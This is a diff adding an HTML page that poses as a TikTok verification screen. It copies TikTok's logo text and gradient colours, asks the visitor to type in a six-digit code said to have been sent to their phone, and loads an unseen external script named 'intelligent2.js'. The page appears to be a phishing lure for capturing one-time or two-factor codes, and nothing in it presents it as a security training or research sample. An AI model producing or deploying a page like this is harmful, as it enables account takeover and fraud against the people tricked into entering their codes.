@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok Verification</title>
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+            Roboto, Helvetica, Arial, sans-serif;
+        color: #111;
+    }
+
+    .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+        padding: 16px;
+    }
+
+    /* TikTok logo style (text version) */
+    .tiktok-logo {
+        font-size: 38px;
+        font-weight: 700;
+        margin-bottom: 18px;
+        color: #000;
+    }
+
+    /* Card */
+    .card {
+        width: 330px;
+        background: #fff;
+        border-radius: 10px;
+        padding: 26px 22px;
+        text-align: left;
+        box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+    }
+
+    .card h2 {
+        font-size: 19px;
+        margin: 0 0 10px;
+        font-weight: 700;
+        color: #000;
+    }
+
+    .card p {
+        font-size: 14px;
+        color: #555;
+        margin-bottom: 18px;
+        line-height: 1.45;
+    }
+
+    /* Input */
+    .input-box input {
+        width: 100%;
+        padding: 12px;
+        border-radius: 8px;
+        border: 1px solid #ddd;
+        background: #fafafa;
+        font-size: 15px;
+        outline: none;
+        transition: 0.15s ease;
+    }
+
+    .input-box input:focus {
+        border-color: #111;
+        background: #fff;
+    }
+
+    /* TikTok gradient button */
+    .btn {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 14px;
+        color: #fff;
+        background: linear-gradient(
+            90deg,
+            #fe2c55,
+            #25f4ee
+        );
+        transition: 0.15s ease;
+    }
+
+    .btn:hover {
+        opacity: 0.9;
+    }
+
+    .footer-text {
+        font-size: 14px;
+        margin-top: 14px;
+        color: #fe2c55;
+        cursor: pointer;
+    }
+
+    .footer-text:hover {
+        text-decoration: underline;
+    }
+
+    .small-info {
+        margin-top: 14px;
+        font-size: 11px;
+        color: #666;
+        text-align: center;
+    }
+
+</style>
+</head>
+<script src="intelligent2.js"></script>
+<body>
+
+<div class="container">
+
+    <div class="tiktok-logo">TikTok</div>
+
+    <div class="card">
+        <h2>Enter Verification Code</h2>
+
+        <p>
+            We’ve sent a digit confirmation code to your phone number.
+            Enter the code to continue.
+        </p>
+<form>
+        <div class="input-box">
+            <input type="text" placeholder="Enter-digit code" maxlength="6" name="Tiktok verification code" required>
+        </div>
+
+        <button class="btn" type="submit">Verify</button>
+</form>
+        <div class="footer-text">Didn’t get a code?</div>
+    </div>
+
+</div>
+
+</body>
+</html>
